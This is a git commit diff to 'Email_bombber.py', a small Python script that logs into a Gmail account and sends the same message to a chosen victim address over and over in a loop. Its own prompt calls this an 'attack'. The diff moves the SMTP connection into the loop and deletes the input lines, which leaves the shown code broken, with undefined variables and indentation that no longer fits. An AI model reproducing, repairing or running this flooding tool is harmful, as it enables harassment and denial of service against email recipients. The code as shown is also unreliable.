8e5325f20027fb93ded872a1089d3aa082805cea
BH007 <83509569+Team6t9@users.noreply.github.com>
2021-05-03 21:02:39 +0600

    Update Email_bombber.py

--- Email_bombber.py
+++ Email_bombber.py
@@ -7,11 +7,7 @@ print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|  
 print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
 print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")
 
-try:
-    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
-    email = input("Enter your gmail_address:")
-    password = input("Enter your gmail_password:")
-    message = input("Enter Message:")
+message = input("Enter Message:")
     counter = int(input("How many message you want to send?:"))
 
     # gmail of outlook
@@ -24,12 +20,9 @@ try:
 
     for x in range(0,counter):
         print("Number of Message Sent : ", x+1)
+        mail = smtplib.SMTP('smtp.gmail.com',587)
         mail.ehlo()
         mail.starttls()
         mail.login(email,password)
         mail.sendmail(email,bomb_email,message)
         time.sleep(1)
-
-    mail.close()
-except Exception as e:
-    print("Something is wrong, please Re-try Again with Valid input.")
